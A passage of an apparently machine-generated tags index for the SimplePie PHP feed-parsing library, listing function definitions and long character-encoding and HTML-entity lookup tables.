"\xC2\xBD", "\xBE" => "\xC2\xBE", "\xBF" => "\xC2\xBF", "\xC0" => "\xC3\x80", "\xC1" => "\xC3\x81", "\xC2" => "\xC3\x82", "\xC3" => "\xC3\x83", "\xC4" => "\xC3\x84", "\xC5" => "\xC3\x85", "\xC6" => "\xC3\x86", "\xC7" => "\xC3\x87", "\xC8" => "\xC3\x88", "\xC9" => "\xC3\x89", "\xCA" => "\xC3\x8A", "\xCB" => "\xC3\x8B", "\xCC" => "\xC3\x8C", "\xCD" => "\xC3\x8D", "\xCE" => "\xC3\x8E", "\xCF" => "\xC3\x8F", "\xD0" => "\xC3\x90", "\xD1" => "\xC3\x91", "\xD2" => "\xC3\x92", "\xD3" => "\xC3\x93", "\xD4" => "\xC3\x94", "\xD5" => "\xC3\x95", "\xD6" => "\xC3\x96", "\xD7" => "\xC3\x97", "\xD8" => "\xC3\x98", "\xD9" => "\xC3\x99", "\xDA" => "\xC3\x9A", "\xDB" => "\xC3\x9B", "\xDC" => "\xC3\x9C", "\xDD" => "\xC3\x9D", "\xDE" => "\xC3\x9E", "\xDF" => "\xC3\x9F", "\xE0" => "\xC3\xA0", "\xE1" => "\xC3\xA1", "\xE2" => "\xC3\xA2", "\xE3" => "\xC3\xA3", "\xE4" => "\xC3\xA4", "\xE5" => "\xC3\xA5", "\xE6" => "\xC3\xA6", "\xE7" => "\xC3\xA7", "\xE8" => "\xC3\xA8", "\xE9" => "\xC3\xA9", "\xEA" => "\xC3\xAA", "\xEB" => "\xC3\xAB", "\xEC" => "\xC3\xAC", "\xED" => "\xC3\xAD", "\xEE" => "\xC3\xAE", "\xEF" => "\xC3\xAF", "\xF0" => "\xC3\xB0", "\xF1" => "\xC3\xB1", "\xF2" => "\xC3\xB2", "\xF3" => "\xC3\xB3", "\xF4" => "\xC3\xB4", "\xF5" => "\xC3\xB5", "\xF6" => "\xC3\xB6", "\xF7" => "\xC3\xB7", "\xF8" => "\xC3\xB8", "\xF9" => "\xC3\xB9", "\xFA" => "\xC3\xBA", "\xFB" => "\xC3\xBB", "\xFC" => "\xC3\xBC", "\xFD" => "\xC3\xBD", "\xFE" => "\xC3\xBE", "\xFF" => "\xC3\xBF");convert_table9435,259715
	function change_encoding($data, $input, $output)change_encoding9440,262698
		$input = SimplePie_Misc::encoding($input);input9442,262751
		$output = SimplePie_Misc::encoding($output);output9443,262796
			static $non_ascii_octects = '';non_ascii_octects9448,262920
			static $non_ascii_octects = '';non_ascii_octects9448,262920
			$data = substr($data, 0, strcspn($data, $non_ascii_octects));data9456,263079
		if ($input === 'windows-1252' && $output === 'UTF-8')output9460,263216
	function encoding($charset)encoding9492,264295
	function get_curl_version()get_curl_version10805,288222
			$curl = $curl['version'];curl10809,288298
			$curl = substr($curl, 5, strcspn($curl, "\x09\x0A\x0B\x0C\x0D", 5));curl10813,288378
			$curl = substr($curl, 8, strcspn($curl, "\x09\x0A\x0B\x0C\x0D", 8));curl10817,288504
			$curl = 0;curl10821,288591
	function is_subclass_of($class1, $class2)is_subclass_of10826,288629
					$class2 = strtolower($class2);class210842,289065
				trigger_error('Unknown class passed as parameter', E_USER_WARNNG);passed10854,289267
	function strip_comments($data)strip_comments10867,289519
		$output = '';output10869,289554
				$data = substr_replace($data, '', 0, $end + 3);data10875,289728
				$data = '';data10879,289798
	function parse_date($dt)parse_date10885,289853
		$parser = SimplePie_Parse_Date::get();parser10887,289882
	function entities_decode($data)entities_decode10899,290093
		$decoder =& new SimplePie_Decode_HTML_Entities($data);decoder10901,290129
	function uncomment_rfc822($string)uncomment_rfc82210912,290373
		$string = (string) $string;string10914,290412
		$position = 0;position10915,290442
		$length = strlen($string);length10916,290459
		$depth = 0;depth10917,290488
		$output = '';output10919,290503
			$position = $pos + 1;position10924,290668
	function parse_mime($mime)parse_mime10966,291317
	function htmlspecialchars_decode($string, $quote_style)htmlspecialchars_decode10978,291483
	function atom_03_construct_type($attribs)atom_03_construct_type10990,291777
			$mode = SIMPLEPIE_CONSTRUCT_BASE64;mode10994,291917
			$mode = SIMPLEPIE_CONSTRUCT_NONE;mode10998,291971
	function atom_10_construct_type($attribs)atom_10_construct_type11026,292511
	function atom_10_content_construct_type($attribs)atom_10_content_construct_type11048,292921
			$type = strtolower(trim($attribs['']['type']));type11052,293014
	function is_isegment_nz_nc($string)is_isegment_nz_nc11079,293519
	function space_seperated_tokens($string)space_seperated_tokens11084,293974
		$space_characters = "\x20\x09\x0A\x0B\x0C\x0D";space_characters11086,294019
		$string_length = strlen($string);string_length11087,294069
		$position = strspn($string, $space_characters);position11089,294106
		$tokens = array();tokens11090,294156
			$len = strcspn($string, $space_characters, $position);len11094,294219
	function array_unique($array)array_unique11103,294438
			$array = (array) $array;array11111,294572
			$new_array = array();new_array11112,294600
			$new_array_strings = array();new_array_strings11113,294625
			foreach ($array as $key => $value)key11114,294658
						$cmp = $value->__toString();cmp11120,294787
					$cmp = (string) reset($value);cmp11129,295008
					$cmp = (string) $value;cmp11133,295065
	function codepoint_to_utf8($codepoint)codepoint_to_utf811153,295436
		$codepoint = (int) $codepoint;codepoint11155,295479
	function stripos($haystack, $needle, $offset = 0)stripos11200,296894
	function stripos($haystack, $needle, $offset = 0)offset11200,296894
				$needle = strtolower($needle);needle11210,297081
				$needle = strtolower(chr($needle));needle11214,297196
	function parse_str($str)parse_str11237,297680
		$return = array();return11239,297709
		$str = explode('&', $str);str11240,297730
	function xml_encoding($data)xml_encoding11265,298207
				$parser =& new SimplePie_XML_Declaration_Parser(SimplePie_Misc::change_encoding(substr($data, 20, $pos - 20), 'UTF-32BE', 'UTF-8'));parser11297,299025
				$parser =& new SimplePie_XML_Declaration_Parser(SimplePie_Misc::change_encoding(substr($data, 20, $pos - 20), 'UTF-32LE', 'UTF-8'));parser11310,299507
				$parser =& new SimplePie_XML_Declaration_Parser(SimplePie_Misc::change_encoding(substr($data, 20, $pos - 10), 'UTF-16BE', 'UTF-8'));parser11323,299930
				$parser =& new SimplePie_XML_Declaration_Parser(SimplePie_Misc::change_encoding(substr($data, 20, $pos - 10), 'UTF-16LE', 'UTF-8'));parser11336,300356
				$parser =& new SimplePie_XML_Declaration_Parser(substr($data, 5, $pos - 5));parser11349,300743
	function output_javascript()output_javascript11365,301023
function embed_odeo(link) {embed_odeo11375,301326
function embed_quicktime(type, bgcolor, width, height, link, placeholder, loop) {embed_quicktime11379,301684
function embed_flash(bgcolor, width, height, link, loop, type) {embed_flash11388,302441
function embed_flv(width, height, link, placeholder, loop, player) {embed_flv11392,302727
function embed_wmedia(width, height, link) {embed_wmedia11396,303115
	function debug($sp)debug11407,303418
		$info = 'SimplePie ' . SIMPLEPIE_VERSION . ' Build ' . SIMPLEPIE_BUILD . "\n";info11409,303442
		$extensions = array('pcre', 'curl', 'zlib', 'mbstring', 'iconv', 'xmlreader', 'xml');extensions11420,303730
						$version = curl_version();version11432,304052
class SimplePie_Decode_HTML_EntitiesSimplePie_Decode_HTML_Entities11462,304663
	var $data = '';data11470,304774
	var $data = '';data11470,304774
	var $consumed = '';consumed11478,304871
	var $consumed = '';consumed11478,304871
	var $position = 0;position11486,304986
	var $position = 0;position11486,304986
	 * Create an instance of the class with the input datawith11489,305012
	function SimplePie_Decode_HTML_Entities($data)SimplePie_Decode_HTML_Entities11494,305131
		$this->data = $data;data11496,305182
	function parse()parse11505,305298
			$this->consumed = '';consumed11511,305446
	function consume()consume11522,305629
	function consume_range($chars)consume_range11542,306020
			$data = substr($this->data, $this->position, $len);data11546,306118
	function unconsume()unconsume11562,306344
		$this->consumed = substr($this->consumed, 0, -1);consumed11564,306369
	function entity()entity11573,306501
						$range = '0123456789ABCDEFabcdef';range11593,306798
						$hex = true;hex11594,306839
						$range = '0123456789';range11598,306886
						$hex = false;hex11599,306915
					static $windows_1252_specials = array(0x0D => "\x0A", 0x80 => "\xE2\x82\xAC", 0x81 => "\xEF\xBF\xBD", 0x82 => "\xE2\x80\x9A", 0x83 => "\xC6\x92", 0x84 => "\xE2\x80\x9E", 0x85 => "\xE2\x80\xA6", 0x86 => "\xE2\x80\xA0", 0x87 => "\xE2\x80\xA1", 0x88 => "\xCB\x86", 0x89 => "\xE2\x80\xB0", 0x8A => "\xC5\xA0", 0x8B => "\xE2\x80\xB9", 0x8C => "\xC5\x92", 0x8D => "\xEF\xBF\xBD", 0x8E => "\xC5\xBD", 0x8F => "\xEF\xBF\xBD", 0x90 => "\xEF\xBF\xBD", 0x91 => "\xE2\x80\x98", 0x92 => "\xE2\x80\x99", 0x93 => "\xE2\x80\x9C", 0x94 => "\xE2\x80\x9D", 0x95 => "\xE2\x80\xA2", 0x96 => "\xE2\x80\x93", 0x97 => "\xE2\x80\x94", 0x98 => "\xCB\x9C", 0x99 => "\xE2\x84\xA2", 0x9A => "\xC5\xA1", 0x9B => "\xE2\x80\xBA", 0x9C => "\xC5\x93", 0x9D => "\xEF\xBF\xBD", 0x9E => "\xC5\xBE", 0x9F => "\xC5\xB8");windows_1252_specials11606,307038
					static $windows_1252_specials = array(0x0D => "\x0A", 0x80 => "\xE2\x82\xAC", 0x81 => "\xEF\xBF\xBD", 0x82 => "\xE2\x80\x9A", 0x83 => "\xC6\x92", 0x84 => "\xE2\x80\x9E", 0x85 => "\xE2\x80\xA6", 0x86 => "\xE2\x80\xA0", 0x87 => "\xE2\x80\xA1", 0x88 => "\xCB\x86", 0x89 => "\xE2\x80\xB0", 0x8A => "\xC5\xA0", 0x8B => "\xE2\x80\xB9", 0x8C => "\xC5\x92", 0x8D => "\xEF\xBF\xBD", 0x8E => "\xC5\xBD", 0x8F => "\xEF\xBF\xBD", 0x90 => "\xEF\xBF\xBD", 0x91 => "\xE2\x80\x98", 0x92 => "\xE2\x80\x99", 0x93 => "\xE2\x80\x9C", 0x94 => "\xE2\x80\x9D", 0x95 => "\xE2\x80\xA2", 0x96 => "\xE2\x80\x93", 0x97 => "\xE2\x80\x94", 0x98 => "\xCB\x9C", 0x99 => "\xE2\x84\xA2", 0x9A => "\xC5\xA1", 0x9B => "\xE2\x80\xBA", 0x9C => "\xC5\x93", 0x9D => "\xEF\xBF\xBD", 0x9E => "\xC5\xBE", 0x9F => "\xC5\xB8");windows_1252_specials11606,307038
						$codepoint = hexdec($codepoint);codepoint11610,307849
						$codepoint = intval($codepoint);codepoint11614,307912
						$replacement = $windows_1252_specials[$codepoint];replacement11619,308018
						$replacement = SimplePie_Misc::codepoint_to_utf8($codepoint);replacement11623,308099
					$consumed_length = strlen($this->consumed);consumed_length11631,308279
					$this->data = substr_replace($this->data, $replacement, $this->position - $consumed_length, $consumed_length);data11632,308328
				static $entities = array('Aacute' => "\xC3\x81", 'aacute' => "\xC3\xA1", 'Aacute;' => "\xC3\x81", 'aacute;' => "\xC3\xA1", 'Acirc' => "\xC3\x82", 'acirc' => "\xC3\xA2", 'Acirc;' => "\xC3\x82", 'acirc;' => "\xC3\xA2", 'acute' => "\xC2\xB4", 'acute;' => "\xC2\xB4", 'AElig' => "\xC3\x86", 'aelig' => "\xC3\xA6", 'AElig;' => "\xC3\x86", 'aelig;' => "\xC3\xA6", 'Agrave' => "\xC3\x80", 'agrave' => "\xC3\xA0", 'Agrave;' => "\xC3\x80", 'agrave;' => "\xC3\xA0", 'alefsym;' => "\xE2\x84\xB5", 'Alpha;' => "\xCE\x91", 'alpha;' => "\xCE\xB1", 'AMP' => "\x26", 'amp' => "\x26", 'AMP;' => "\x26", 'amp;' => "\x26", 'and;' => "\xE2\x88\xA7", 'ang;' => "\xE2\x88\xA0", 'apos;' => "\x27", 'Aring' => "\xC3\x85", 'aring' => "\xC3\xA5", 'Aring;' => "\xC3\x85", 'aring;' => "\xC3\xA5", 'asymp;' => "\xE2\x89\x88", 'Atilde' => "\xC3\x83", 'atilde' => "\xC3\xA3", 'Atilde;' => "\xC3\x83", 'atilde;' => "\xC3\xA3", 'Auml' => "\xC3\x84", 'auml' => "\xC3\xA4", 'Auml;' => "\xC3\x84", 'auml;' => "\xC3\xA4", 'bdquo;' => "\xE2\x80\x9E", 'Beta;' => "\xCE\x92", 'beta;' => "\xCE\xB2", 'brvbar' => "\xC2\xA6", 'brvbar;' => "\xC2\xA6", 'bull;' => "\xE2\x80\xA2", 'cap;' => "\xE2\x88\xA9", 'Ccedil' => "\xC3\x87", 'ccedil' => "\xC3\xA7", 'Ccedil;' => "\xC3\x87", 'ccedil;' => "\xC3\xA7", 'cedil' => "\xC2\xB8", 'cedil;' => "\xC2\xB8", 'cent' => "\xC2\xA2", 'cent;' => "\xC2\xA2", 'Chi;' => "\xCE\xA7", 'chi;' => "\xCF\x87", 'circ;' => "\xCB\x86", 'clubs;' => "\xE2\x99\xA3", 'cong;' => "\xE2\x89\x85", 'COPY' => "\xC2\xA9", 'copy' => "\xC2\xA9", 'COPY;' => "\xC2\xA9", 'copy;' => "\xC2\xA9", 'crarr;' => "\xE2\x86\xB5", 'cup;' => "\xE2\x88\xAA", 'curren' => "\xC2\xA4", 'curren;' => "\xC2\xA4", 'Dagger;' => "\xE2\x80\xA1", 'dagger;' => "\xE2\x80\xA0", 'dArr;' => "\xE2\x87\x93", 'darr;' => "\xE2\x86\x93", 'deg' => "\xC2\xB0", 'deg;' => "\xC2\xB0", 'Delta;' => "\xCE\x94", 'delta;' => "\xCE\xB4", 'diams;' => "\xE2\x99\xA6", 'divide' => "\xC3\xB7", 'divide;' => "\xC3\xB7", 'Eacute' => "\xC3\x89", 'eacute' => "\xC3\xA9", 'Eacute;' => "\xC3\x89", 'eacute;' => "\xC3\xA9", 'Ecirc' => "\xC3\x8A", 'ecirc' => "\xC3\xAA", 'Ecirc;' => "\xC3\x8A", 'ecirc;' => "\xC3\xAA", 'Egrave' => "\xC3\x88", 'egrave' => "\xC3\xA8", 'Egrave;' => "\xC3\x88", 'egrave;' => "\xC3\xA8", 'empty;' => "\xE2\x88\x85", 'emsp;' => "\xE2\x80\x83", 'ensp;' => "\xE2\x80\x82", 'Epsilon;' => "\xCE\x95", 'epsilon;' => "\xCE\xB5", 'equiv;' => "\xE2\x89\xA1", 'Eta;' => "\xCE\x97", 'eta;' => "\xCE\xB7", 'ETH' => "\xC3\x90", 'eth' => "\xC3\xB0", 'ETH;' => "\xC3\x90", 'eth;' => "\xC3\xB0", 'Euml' => "\xC3\x8B", 'euml' => "\xC3\xAB", 'Euml;' => "\xC3\x8B", 'euml;' => "\xC3\xAB", 'euro;' => "\xE2\x82\xAC", 'exist;' => "\xE2\x88\x83", 'fnof;' => "\xC6\x92", 'forall;' => "\xE2\x88\x80", 'frac12' => "\xC2\xBD", 'frac12;' => "\xC2\xBD", 'frac14' => "\xC2\xBC", 'frac14;' => "\xC2\xBC", 'frac34' => "\xC2\xBE", 'frac34;' => "\xC2\xBE", 'frasl;' => "\xE2\x81\x84", 'Gamma;' => "\xCE\x93", 'gamma;' => "\xCE\xB3", 'ge;' => "\xE2\x89\xA5", 'GT' => "\x3E", 'gt' => "\x3E", 'GT;' => "\x3E", 'gt;' => "\x3E", 'hArr;' => "\xE2\x87\x94", 'harr;' => "\xE2\x86\x94", 'hearts;' => "\xE2\x99\xA5", 'hellip;' => "\xE2\x80\xA6", 'Iacute' => "\xC3\x8D", 'iacute' => "\xC3\xAD", 'Iacute;' => "\xC3\x8D", 'iacute;' => "\xC3\xAD", 'Icirc' => "\xC3\x8E", 'icirc' => "\xC3\xAE", 'Icirc;' => "\xC3\x8E", 'icirc;' => "\xC3\xAE", 'iexcl' => "\xC2\xA1", 'iexcl;' => "\xC2\xA1", 'Igrave' => "\xC3\x8C", 'igrave' => "\xC3\xAC", 'Igrave;' => "\xC3\x8C", 'igrave;' => "\xC3\xAC", 'image;' => "\xE2\x84\x91", 'infin;' => "\xE2\x88\x9E", 'int;' => "\xE2\x88\xAB", 'Iota;' => "\xCE\x99", 'iota;' => "\xCE\xB9", 'iquest' => "\xC2\xBF", 'iquest;' => "\xC2\xBF", 'isin;' => "\xE2\x88\x88", 'Iuml' => "\xC3\x8F", 'iuml' => "\xC3\xAF", 'Iuml;' => "\xC3\x8F", 'iuml;' => "\xC3\xAF", 'Kappa;' => "\xCE\x9A", 'kappa;' => "\xCE\xBA", 'Lambda;' => "\xCE\x9B", 'lambda;' => "\xCE\xBB", 'lang;' => "\xE3\x80\x88", 'laquo' => "\xC2\xAB", 'laquo;' => "\xC2\xAB", 'lArr;' => "\xE2\x87\x90", 'larr;' => "\xE2\x86\x90", 'lceil;' => "\xE2\x8C\x88", 'ldquo;' => "\xE2\x80\x9C", 'le;' => "\xE2\x89\xA4", 'lfloor;' => "\xE2\x8C\x8A", 'lowast;' => "\xE2\x88\x97", 'loz;' => "\xE2\x97\x8A", 'lrm;' => "\xE2\x80\x8E", 'lsaquo;' => "\xE2\x80\xB9", 'lsquo;' => "\xE2\x80\x98", 'LT' => "\x3C", 'lt' => "\x3C", 'LT;' => "\x3C", 'lt;' => "\x3C", 'macr' => "\xC2\xAF", 'macr;' => "\xC2\xAF", 'mdash;' => "\xE2\x80\x94", 'micro' => "\xC2\xB5", 'micro;' => "\xC2\xB5", 'middot' => "\xC2\xB7", 'middot;' => "\xC2\xB7", 'minus;' => "\xE2\x88\x92", 'Mu;' => "\xCE\x9C", 'mu;' => "\xCE\xBC", 'nabla;' => "\xE2\x88\x87", 'nbsp' => "\xC2\xA0", 'nbsp;' => "\xC2\xA0", 'ndash;' => "\xE2\x80\x93", 'ne;' => "\xE2\x89\xA0", 'ni;' => "\xE2\x88\x8B", 'not' => "\xC2\xAC", 'not;' => "\xC2\xAC", 'notin;' => "\xE2\x88\x89", 'nsub;' => "\xE2\x8A\x84", 'Ntilde' => "\xC3\x91", 'ntilde' => "\xC3\xB1", 'Ntilde;' => "\xC3\x91", 'ntilde;' => "\xC3\xB1", 'Nu;' => "\xCE\x9D", 'nu;' => "\xCE\xBD", 'Oacute' => "\xC3\x93", 'oacute' => "\xC3\xB3", 'Oacute;' => "\xC3\x93", 'oacute;' => "\xC3\xB3", 'Ocirc' => "\xC3\x94", 'ocirc' => "\xC3\xB4", 'Ocirc;' => "\xC3\x94", 'ocirc;' => "\xC3\xB4", 'OElig;' => "\xC5\x92", 'oelig;' => "\xC5\x93", 'Ograve' => "\xC3\x92", 'ograve' => "\xC3\xB2", 'Ograve;' => "\xC3\x92", 'ograve;' => "\xC3\xB2", 'oline;' => "\xE2\x80\xBE", 'Omega;' => "\xCE\xA9", 'omega;' => "\xCF\x89", 'Omicron;' => "\xCE\x9F", 'omicron;' => "\xCE\xBF", 'oplus;' => "\xE2\x8A\x95", 'or;' => "\xE2\x88\xA8", 'ordf' => "\xC2\xAA", 'ordf;' => "\xC2\xAA", 'ordm' => "\xC2\xBA", 'ordm;' => "\xC2\xBA", 'Oslash' => "\xC3\x98", 'oslash' => "\xC3\xB8", 'Oslash;' => "\xC3\x98", 'oslash;' => "\xC3\xB8", 'Otilde' => "\xC3\x95", 'otilde' => "\xC3\xB5", 'Otilde;' => "\xC3\x95", 'otilde;' => "\xC3\xB5", 'otimes;' => "\xE2\x8A\x97", 'Ouml' => "\xC3\x96", 'ouml' => "\xC3\xB6", 'Ouml;' => "\xC3\x96", 'ouml;' => "\xC3\xB6", 'para' => "\xC2\xB6", 'para;' => "\xC2\xB6", 'part;' => "\xE2\x88\x82", 'permil;' => "\xE2\x80\xB0", 'perp;' => "\xE2\x8A\xA5", 'Phi;' => "\xCE\xA6", 'phi;' => "\xCF\x86", 'Pi;' => "\xCE\xA0", 'pi;' => "\xCF\x80", 'piv;' => "\xCF\x96", 'plusmn' => "\xC2\xB1", 'plusmn;' => "\xC2\xB1", 'pound' => "\xC2\xA3", 'pound;' => "\xC2\xA3", 'Prime;' => "\xE2\x80\xB3", 'prime;' => "\xE2\x80\xB2", 'prod;' => "\xE2\x88\x8F", 'prop;' => "\xE2\x88\x9D", 'Psi;' => "\xCE\xA8", 'psi;' => "\xCF\x88", 'QUOT' => "\x22", 'quot' => "\x22", 'QUOT;' => "\x22", 'quot;' => "\x22", 'radic;' => "\xE2\x88\x9A", 'rang;' => "\xE3\x80\x89", 'raquo' => "\xC2\xBB", 'raquo;' => "\xC2\xBB", 'rArr;' => "\xE2\x87\x92", 'rarr;' => "\xE2\x86\x92", 'rceil;' => "\xE2\x8C\x89", 'rdquo;' => "\xE2\x80\x9D", 'real;' => "\xE2\x84\x9C", 'REG' => "\xC2\xAE", 'reg' => "\xC2\xAE", 'REG;' => "\xC2\xAE", 'reg;' => "\xC2\xAE", 'rfloor;' => "\xE2\x8C\x8B", 'Rho;' => "\xCE\xA1", 'rho;' => "\xCF\x81", 'rlm;' => "\xE2\x80\x8F", 'rsaquo;' => "\xE2\x80\xBA", 'rsquo;' => "\xE2\x80\x99", 'sbquo;' => "\xE2\x80\x9A", 'Scaron;' => "\xC5\xA0", 'scaron;' => "\xC5\xA1", 'sdot;' => "\xE2\x8B\x85", 'sect' => "\xC2\xA7", 'sect;' => "\xC2\xA7", 'shy' => "\xC2\xAD", 'shy;' => "\xC2\xAD", 'Sigma;' => "\xCE\xA3", 'sigma;' => "\xCF\x83", 'sigmaf;' => "\xCF\x82", 'sim;' => "\xE2\x88\xBC", 'spades;' => "\xE2\x99\xA0", 'sub;' => "\xE2\x8A\x82", 'sube;' => "\xE2\x8A\x86", 'sum;' => "\xE2\x88\x91", 'sup;' => "\xE2\x8A\x83", 'sup1' => "\xC2\xB9", 'sup1;' => "\xC2\xB9", 'sup2' => "\xC2\xB2", 'sup2;' => "\xC2\xB2", 'sup3' => "\xC2\xB3", 'sup3;' => "\xC2\xB3", 'supe;' => "\xE2\x8A\x87", 'szlig' => "\xC3\x9F", 'szlig;' => "\xC3\x9F", 'Tau;' => "\xCE\xA4", 'tau;' => "\xCF\x84", 'there4;' => "\xE2\x88\xB4", 'Theta;' => "\xCE\x98", 'theta;' => "\xCE\xB8", 'thetasym;' => "\xCF\x91", 'thinsp;' => "\xE2\x80\x89", 'THORN' => "\xC3\x9E", 'thorn' => "\xC3\xBE", 'THORN;' => "\xC3\x9E", 'thorn;' => "\xC3\xBE", 'tilde;' => "\xCB\x9C", 'times' => "\xC3\x97", 'times;' => "\xC3\x97", 'TRADE;' => "\xE2\x84\xA2", 'trade;' => "\xE2\x84\xA2", 'Uacute' => "\xC3\x9A", 'uacute' => "\xC3\xBA", 'Uacute;' => "\xC3\x9A", 'uacute;' => "\xC3\xBA", 'uArr;' => "\xE2\x87\x91", 'uarr;' => "\xE2\x86\x91", 'Ucirc' => "\xC3\x9B", 'ucirc' => "\xC3\xBB", 'Ucirc;' => "\xC3\x9B", 'ucirc;' => "\xC3\xBB", 'Ugrave' => "\xC3\x99", 'ugrave' => "\xC3\xB9", 'Ugrave;' => "\xC3\x99", 'ugrave;' => "\xC3\xB9", 'uml' => "\xC2\xA8", 'uml;' => "\xC2\xA8", 'upsih;' => "\xCF\x92", 'Upsilon;' => "\xCE\xA5", 'upsilon;' => "\xCF\x85", 'Uuml' => "\xC3\x9C", 'uuml' => "\xC3\xBC", 'Uuml;' => "\xC3\x9C", 'uuml;' => "\xC3\xBC", 'weierp;' => "\xE2\x84\x98", 'Xi;' => "\xCE\x9E", 'xi;' => "\xCE\xBE", 'Yacute' => "\xC3\x9D", 'yacute' => "\xC3\xBD", 'Yacute;' => "\xC3\x9D", 'yacute;' => "\xC3\xBD", 'yen' => "\xC2\xA5", 'yen;' => "\xC2\xA5", 'yuml' => "\xC3\xBF", 'Yuml;' => "\xC5\xB8", 'yuml;' => "\xC3\xBF", 'Zeta;' => "\xCE\x96", 'zeta;' => "\xCE\xB6", 'zwj;' => "\xE2\x80\x8D", 'zwnj;' => "\xE2\x80\x8C");entities11638,308539
				static $entities = array('Aacute' => "\xC3\x81", 'aacute' => "\xC3\xA1", 'Aacute;' => "\xC3\x81", 'aacute;' => "\xC3\xA1", 'Acirc' => "\xC3\x82", 'acirc' => "\xC3\xA2", 'Acirc;' => "\xC3\x82", 'acirc;' => "\xC3\xA2", 'acute' => "\xC2\xB4", 'acute;' => "\xC2\xB4", 'AElig' => "\xC3\x86", 'aelig' => "\xC3\xA6", 'AElig;' => "\xC3\x86", 'aelig;' => "\xC3\xA6", 'Agrave' => "\xC3\x80", 'agrave' => "\xC3\xA0", 'Agrave;' => "\xC3\x80", 'agrave;' => "\xC3\xA0", 'alefsym;' => "\xE2\x84\xB5", 'Alpha;' => "\xCE\x91", 'alpha;' => "\xCE\xB1", 'AMP' => "\x26", 'amp' => "\x26", 'AMP;' => "\x26", 'amp;' => "\x26", 'and;' => "\xE2\x88\xA7", 'ang;' => "\xE2\x88\xA0", 'apos;' => "\x27", 'Aring' => "\xC3\x85", 'aring' => "\xC3\xA5", 'Aring;' => "\xC3\x85", 'aring;' => "\xC3\xA5", 'asymp;' => "\xE2\x89\x88", 'Atilde' => "\xC3\x83", 'atilde' => "\xC3\xA3", 'Atilde;' => "\xC3\x83", 'atilde;' => "\xC3\xA3", 'Auml' => "\xC3\x84", 'auml' => "\xC3\xA4", 'Auml;' => "\xC3\x84", 'auml;' => "\xC3\xA4", 'bdquo;' => "\xE2\x80\x9E", 'Beta;' => "\xCE\x92", 'beta;' => "\xCE\xB2", 'brvbar' => "\xC2\xA6", 'brvbar;' => "\xC2\xA6", 'bull;' => "\xE2\x80\xA2", 'cap;' => "\xE2\x88\xA9", 'Ccedil' => "\xC3\x87", 'ccedil' => "\xC3\xA7", 'Ccedil;' => "\xC3\x87", 'ccedil;' => "\xC3\xA7", 'cedil' => "\xC2\xB8", 'cedil;' => "\xC2\xB8", 'cent' => "\xC2\xA2", 'cent;' => "\xC2\xA2", 'Chi;' => "\xCE\xA7", 'chi;' => "\xCF\x87", 'circ;' => "\xCB\x86", 'clubs;' => "\xE2\x99\xA3", 'cong;' => "\xE2\x89\x85", 'COPY' => "\xC2\xA9", 'copy' => "\xC2\xA9", 'COPY;' => "\xC2\xA9", 'copy;' => "\xC2\xA9", 'crarr;' => "\xE2\x86\xB5", 'cup;' => "\xE2\x88\xAA", 'curren' => "\xC2\xA4", 'curren;' => "\xC2\xA4", 'Dagger;' => "\xE2\x80\xA1", 'dagger;' => "\xE2\x80\xA0", 'dArr;' => "\xE2\x87\x93", 'darr;' => "\xE2\x86\x93", 'deg' => "\xC2\xB0", 'deg;' => "\xC2\xB0", 'Delta;' => "\xCE\x94", 'delta;' => "\xCE\xB4", 'diams;' => "\xE2\x99\xA6", 'divide' => "\xC3\xB7", 'divide;' => "\xC3\xB7", 'Eacute' => "\xC3\x89", 'eacute' => "\xC3\xA9", 'Eacute;' => "\xC3\x89", 'eacute;' => "\xC3\xA9", 'Ecirc' => "\xC3\x8A", 'ecirc' => "\xC3\xAA", 'Ecirc;' => "\xC3\x8A", 'ecirc;' => "\xC3\xAA", 'Egrave' => "\xC3\x88", 'egrave' => "\xC3\xA8", 'Egrave;' => "\xC3\x88", 'egrave;' => "\xC3\xA8", 'empty;' => "\xE2\x88\x85", 'emsp;' => "\xE2\x80\x83", 'ensp;' => "\xE2\x80\x82", 'Epsilon;' => "\xCE\x95", 'epsilon;' => "\xCE\xB5", 'equiv;' => "\xE2\x89\xA1", 'Eta;' => "\xCE\x97", 'eta;' => "\xCE\xB7", 'ETH' => "\xC3\x90", 'eth' => "\xC3\xB0", 'ETH;' => "\xC3\x90", 'eth;' => "\xC3\xB0", 'Euml' => "\xC3\x8B", 'euml' => "\xC3\xAB", 'Euml;' => "\xC3\x8B", 'euml;' => "\xC3\xAB", 'euro;' => "\xE2\x82\xAC", 'exist;' => "\xE2\x88\x83", 'fnof;' => "\xC6\x92", 'forall;' => "\xE2\x88\x80", 'frac12' => "\xC2\xBD", 'frac12;' => "\xC2\xBD", 'frac14' => "\xC2\xBC", 'frac14;' => "\xC2\xBC", 'frac34' => "\xC2\xBE", 'frac34;' => "\xC2\xBE", 'frasl;' => "\xE2\x81\x84", 'Gamma;' => "\xCE\x93", 'gamma;' => "\xCE\xB3", 'ge;' => "\xE2\x89\xA5", 'GT' => "\x3E", 'gt' => "\x3E", 'GT;' => "\x3E", 'gt;' => "\x3E", 'hArr;' => "\xE2\x87\x94", 'harr;' => "\xE2\x86\x94", 'hearts;' => "\xE2\x99\xA5", 'hellip;' => "\xE2\x80\xA6", 'Iacute' => "\xC3\x8D", 'iacute' => "\xC3\xAD", 'Iacute;' => "\xC3\x8D", 'iacute;' => "\xC3\xAD", 'Icirc' => "\xC3\x8E", 'icirc' => "\xC3\xAE", 'Icirc;' => "\xC3\x8E", 'icirc;' => "\xC3\xAE", 'iexcl' => "\xC2\xA1", 'iexcl;' => "\xC2\xA1", 'Igrave' => "\xC3\x8C", 'igrave' => "\xC3\xAC", 'Igrave;' => "\xC3\x8C", 'igrave;' => "\xC3\xAC", 'image;' => "\xE2\x84\x91", 'infin;' => "\xE2\x88\x9E", 'int;' => "\xE2\x88\xAB", 'Iota;' => "\xCE\x99", 'iota;' => "\xCE\xB9", 'iquest' => "\xC2\xBF", 'iquest;' => "\xC2\xBF", 'isin;' => "\xE2\x88\x88", 'Iuml' => "\xC3\x8F", 'iuml' => "\xC3\xAF", 'Iuml;' => "\xC3\x8F", 'iuml;' => "\xC3\xAF", 'Kappa;' => "\xCE\x9A", 'kappa;' => "\xCE\xBA", 'Lambda;' => "\xCE\x9B", 'lambda;' => "\xCE\xBB", 'lang;' => "\xE3\x80\x88", 'laquo' => "\xC2\xAB", 'laquo;' => "\xC2\xAB", 'lArr;' => "\xE2\x87\x90", 'larr;' => "\xE2\x86\x90", 'lceil;' => "\xE2\x8C\x88", 'ldquo;' => "\xE2\x80\x9C", 'le;' => "\xE2\x89\xA4", 'lfloor;' => "\xE2\x8C\x8A", 'lowast;' => "\xE2\x88\x97", 'loz;' => "\xE2\x97\x8A", 'lrm;' => 